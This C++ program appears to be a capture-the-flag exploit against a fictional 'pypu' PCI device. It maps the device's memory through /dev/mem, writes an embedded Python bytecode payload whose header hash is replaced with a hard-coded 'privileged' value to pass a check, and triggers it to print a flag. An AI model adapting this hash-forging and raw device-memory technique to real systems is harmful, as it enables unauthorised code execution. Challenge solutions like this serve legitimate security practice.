#include <dirent.h>
#include <err.h>
#include <fcntl.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#include <string>

namespace {

uint8_t payload[] = {
    0xf3, 0x0d, 0x0d, 0x0a, 0x00, 0x00, 0x00, 0x00, 0x3d, 0x84, 0x3f, 0x69,
    0x1f, 0x00, 0x00, 0x00, 0xe3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0xf3, 0x30, 0x00, 0x00, 0x00, 0x95, 0x00, 0x53, 0x00, 0x53, 0x01,
    0x4b, 0x00, 0x72, 0x00, 0x5c, 0x01, 0x22, 0x00, 0x5c, 0x00, 0x52, 0x04,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x35, 0x01, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x20, 0x00, 0x67, 0x01, 0x29, 0x02, 0xe9, 0x00, 0x00, 0x00,
    0x00, 0x4e, 0x29, 0x03, 0xda, 0x05, 0x67, 0x69, 0x66, 0x74, 0x73, 0xda,
    0x05, 0x70, 0x72, 0x69, 0x6e, 0x74, 0xda, 0x04, 0x66, 0x6c, 0x61, 0x67,
    0xa9, 0x00, 0xf3, 0x00, 0x00, 0x00, 0x00, 0xda, 0x0e, 0x68, 0x65, 0x6c,
    0x6c, 0x6f, 0x5f, 0x77, 0x6f, 0x72, 0x6c, 0x64, 0x2e, 0x70, 0x79, 0xda,
    0x08, 0x3c, 0x6d, 0x6f, 0x64, 0x75, 0x6c, 0x65, 0x3e, 0x72, 0x09, 0x00,
    0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x73, 0x14, 0x00, 0x00, 0x00, 0xf0,
    0x03, 0x01, 0x01, 0x01, 0xdb, 0x00, 0x0c, 0xd9, 0x00, 0x05, 0x80, 0x65,
    0x87, 0x6a, 0x81, 0x6a, 0xd5, 0x00, 0x11, 0x72, 0x07, 0x00, 0x00, 0x00};
unsigned int payload_len = 192;

struct PCIAddresses {
  uint64_t bar0;
  uint64_t bar1;
  uint64_t bar2;
};

uint32_t read_hex_file(const std::string& path) {
  FILE* f = fopen(path.c_str(), "r");
  if (f == nullptr) {
    err(EXIT_FAILURE, "fopen");
  }
  uint32_t res;
  if (fscanf(f, "%x", &res) != 1) {
    fprintf(stderr, "fscanf read_hex_file\n");
    exit(EXIT_FAILURE);
  }

  fclose(f);
  return res;
}

PCIAddresses find_pypu_device() {
  PCIAddresses addresses = {};
  bool found = false;

  constexpr char kPciPath[] = "/sys/bus/pci/devices";
  DIR* dir = opendir(kPciPath);
  if (dir == nullptr) {
    err(EXIT_FAILURE, "opendir");
  }
  struct dirent* entry;
  while ((entry = readdir(dir)) != nullptr) {
    if (entry->d_name[0] == '.') {
      continue;
    }

    constexpr uint32_t kVendor = 0x1337;
    constexpr uint32_t kDevice = 0x1225;

    const std::string base_path = std::string(kPciPath) + "/" + entry->d_name;

    uint32_t vendor = read_hex_file(base_path + "/vendor");
    uint32_t device = read_hex_file(base_path + "/device");

    if (vendor != kVendor or device != kDevice) {
      continue;
    }
    found = true;
    fprintf(stderr, "[!] Found device at %s\n", base_path.c_str());

    const std::string resource_path = base_path + "/resource";
    FILE* resource = fopen(resource_path.c_str(), "r");
    if (resource == nullptr) {
      err(EXIT_FAILURE, "fopen(resource)");
    }

    fscanf(resource, "%lx %*x %*x\n", &addresses.bar0);
    fscanf(resource, "%lx %*x %*x\n", &addresses.bar2);
    fscanf(resource, "%lx %*x %*x\n", &addresses.bar1);

    fclose(resource);
    break;
  }
  closedir(dir);

  if (!found) {
    fprintf(stderr, "device not found\n");
    exit(EXIT_FAILURE);
  }

  return addresses;
}

#define ALWAYS_INLINE __attribute__((always_inline)) inline

ALWAYS_INLINE uint32_t r32(uintptr_t addr) {
  uint32_t result;
  __asm__ volatile("mov (%1), %0\n" : "=r"(result) : "r"(addr) : "memory");
  return result;
}

ALWAYS_INLINE uint8_t r8(uintptr_t addr) {
  uint8_t result;
  __asm__ volatile("movb (%1), %0\n" : "=r"(result) : "r"(addr) : "memory");
  return result;
}

ALWAYS_INLINE void w64(uintptr_t addr, uint64_t val) {
  __asm__ volatile("movq %[val], (%[addr])\n" ::[val] "r"(val), [addr] "r"(addr)
                   : "memory");
}

ALWAYS_INLINE void w32(uintptr_t addr, uint32_t val) {
  __asm__ volatile("mov %[val], (%[addr])\n" ::[val] "r"(val), [addr] "r"(addr)
                   : "memory");
}

ALWAYS_INLINE void w8(uintptr_t addr, uint8_t val) {
  __asm__ volatile("movb %[val], (%[addr])\n" ::[val] "r"(val), [addr] "r"(addr)
                   : "memory");
}

ALWAYS_INLINE void read_buffer(uintptr_t addr, uint8_t* dst, size_t n) {
  for (size_t i = 0; i < n; i++) {
    dst[i] = r8(addr + i);
  }
}

ALWAYS_INLINE void write_buffer(uintptr_t addr, uint8_t* src, size_t n) {
  for (size_t i = 0; i < n; i++) {
    w8(addr + i, src[i]);
  }
}

}  //  namespace

int main(void) {
  constexpr uint64_t kPrivilegedHash = 0xf0a0101a75bc9dd3ULL;

  w64(reinterpret_cast<uintptr_t>(payload) + 8, kPrivilegedHash);

  PCIAddresses addresses = find_pypu_device();
  fprintf(stderr, "[!] BAR0 start: %lx\n", addresses.bar0);
  fprintf(stderr, "[!] BAR1 start: %lx\n", addresses.bar1);
  fprintf(stderr, "[!] BAR2 start: %lx\n", addresses.bar2);

  int mem_fd = open("/dev/mem", O_RDWR | O_SYNC);
  if (mem_fd == -1) {
    err(EXIT_FAILURE, "open(/dev/mem)");
  }
  constexpr size_t kPageSz = 0x1000;

  void* control_mapping = mmap(nullptr, kPageSz, PROT_READ | PROT_WRITE,
                               MAP_SHARED, mem_fd, addresses.bar0);
  if (control_mapping == MAP_FAILED) {
    err(EXIT_FAILURE, "mmap control_mapping");
  }

  void* stderr_mapping = mmap(nullptr, kPageSz, PROT_READ | PROT_WRITE,
                              MAP_SHARED, mem_fd, addresses.bar1);
  if (stderr_mapping == MAP_FAILED) {
    err(EXIT_FAILURE, "mmap stderr_mapping");
  }

  void* stdout_mapping = mmap(nullptr, kPageSz, PROT_READ | PROT_WRITE,
                              MAP_SHARED, mem_fd, addresses.bar2);
  if (stdout_mapping == MAP_FAILED) {
    err(EXIT_FAILURE, "mmap stdout_mapping");
  }

  const uintptr_t stderr_base = reinterpret_cast<uintptr_t>(stderr_mapping);
  const uintptr_t stdout_base = reinterpret_cast<uintptr_t>(stdout_mapping);
  const uintptr_t control_base = reinterpret_cast<uintptr_t>(control_mapping);

  const uintptr_t scratch_addr = control_base + 0x4;
  const uintptr_t greet_count_addr = control_base + 0x8;
  const uintptr_t trigger_addr = control_base + 0xc;
  const uintptr_t codelen_addr = control_base + 0x10;
  const uintptr_t codebuf_addr = control_base + 0x100;

  uint32_t header = r32(control_base);
  fprintf(stderr, "read header: %.4s\n", reinterpret_cast<char*>(&header));

  w32(scratch_addr, 0xdeadbeef);
  uint32_t scratch = r32(scratch_addr);
  fprintf(stderr, "read scratch: %x\n", scratch);

  write_buffer(codebuf_addr, payload, payload_len);
  w32(codelen_addr, payload_len);
  w32(trigger_addr, 1);

  uint32_t greet_count = r32(greet_count_addr);
  fprintf(stderr, "greet_count: %u\n", greet_count);

  uint8_t buf[kPageSz] = {0};
  read_buffer(stderr_base, buf, kPageSz);
  fprintf(stderr, "stderr: %s\n", reinterpret_cast<char*>(buf));

  read_buffer(stdout_base, buf, kPageSz);
  fprintf(stderr, "stdout: %s\n", reinterpret_cast<char*>(buf));

  close(mem_fd);
  munmap(control_mapping, kPageSz);
  munmap(stdout_mapping, kPageSz);
  munmap(stderr_mapping, kPageSz);

  return 0;
}
